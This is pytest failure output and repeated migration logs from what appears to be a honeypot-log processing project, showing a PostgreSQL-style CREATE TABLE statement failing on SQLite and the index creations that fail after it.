(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,434:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,438:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,439:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,440:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,442:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:58,444:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_______________________ test_apply_migrations_idempotent _______________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_apply_migrations_idempote0')

    def test_apply_migrations_idempotent(tmp_path) -> None:
        """Running migrations repeatedly keeps the schema version stable."""
        engine = _engine_for_tmp(tmp_path)
>       first = apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/unit/test_schema_migrations.py:72: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566c89f770>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,011:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,013:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,020:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,022:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,026:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,028:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:59,033:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
